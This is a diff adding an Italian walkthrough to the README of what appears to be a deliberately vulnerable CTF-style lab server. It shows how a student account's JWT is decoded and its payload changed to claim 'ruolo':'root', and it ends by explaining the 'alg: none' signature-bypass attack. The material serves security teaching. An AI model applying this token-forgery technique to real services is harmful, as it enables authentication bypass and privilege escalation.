@@ -71,4 +71,90 @@ Il software implementato provvede ad esporre su *localhost*, sulla porta 3000, q
 - */scopriruolo*
   - attraverso una chiamata di tipo *GET* inserendo il JWT ricevuto dalla chiamata di login all'interno dell'Authorization Header il software controllerà il ruolo dell'utente e, nel caso si riesca a catturare la bandiera, restituirà il messaggio *"Sei ufficialmente root"* 
   
+## Esecuzione dell'attacco
 
+**1) Per procedere all'attacco eseguiamo il server e provvediamo a registrare un account di tipo *studente*. Chiamiamo quindi l'endpoint */registration* con le credenziali scelte**
+ ```
+  { 
+  "username":"studente_semplice",
+  "password":"test"
+  }
+  ```
+  Il sistema verificherà la correttezza del JSON e risponderà in questo modo
+  ```
+  {
+    "username": "studente_semplice",
+    "password": "test",
+    "ruolo": null
+  }
+   ```
+**2) Effettuiamo la login con le credenziali scelte chiamando l'endpoint */login* **
+ 
+ Se le credenziali sono corrette il server risponderà in questo modo
+  ```
+ {
+    "message": "Hai effettuato l'accesso come studente_semplice",
+    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSJ9.MerWIMtpam34E_oVk5vos7i1XsgHhJDGxqe2yxo2r40"
+}
+  ```
+  Il valore della chiave *auth_token* è il nostro JWT
+  
+**3) Proviamo a chiamare l'endpoint */scopriruolo* con il JWT ricevuto e verifichiamo la risposta**
+ ```
+ {
+    "message": "Benvenuto studente!"
+  }
+```
+  Come si evince, senza alcuna modifica non siamo in grado di *catturare la bandiera*
+ 
+**4) Andiamo ad analizzare il JWT appena ricevuto**
+ ```
+ ```
+ La prima parte del JWT è quella che riguarda l'Header, dove viene specificato l'algoritmo di codifica
+ ```
+ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+ ```
+ Decodificando questa parte otteniamo questo JSON
+ ```
+ {
+  "typ": "JWT",
+  "alg": "HS256"
+  }
+ ```
+ Come si può notare, nella chiave *alg* è chiaramente specificato l'algoritmo di codifica *HS256*
+ 
+ Procediamo quindi ad analizzare la seconda parte del JWT, quella che contiene il payload
+ ```
+ eyJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSJ9
+ ```
+ Decodificando questa parte otteniamo questo JSON
+ ```
+ {
+  "username": "studente_semplice"
+  }
+ ```
+ Di fatto dovremmo modificare il payload per provare ad ottenere la bandiera
+ 
+ La terza parte del JWT contiene una firma con una chiave *segreta* di entrambi i due blocchi qui sopra descritti. Ne va di conseguenza che se provassimo a modificare solo il payload, lasciando inalterata la firma, il sistema non sarebbe in grado di verificare la correttezza del Token.
+ 
+ Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON
+ ```
+ {
+  "username": "studente_semplice",
+ "ruolo":"root"
+}
+ ```
+ Che codificato risulta essere
+ ```
+ ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9
+ ```
+ Il nuovo JWT sarà quindi
+ ```
+ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.MerWIMtpam34E_oVk5vos7i1XsgHhJDGxqe2yxo2r40
+ ```
+ Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server non sarà in grado di verificare la firma e restituirà un errore di tipo *JWTDecodeError*
+ 
+**5) L'attacco**
+
+L'header del JWT indica al server *come* verificare la firma del Token appena inviato. Inserendo quindi all'interno dell'header un algoritmo diverso si può "ingannare" il server e forzare a verificare la firma con l'algoritmo indicato.
+Inserendo il valore *none* nella chiave *alg* dell'header ed escludendo la terza parte del JWT, quella relativa alla firma (poiché di fatto l'algoritmo *none* non effettua nessuna firma) si può provare ad ingannare il server.
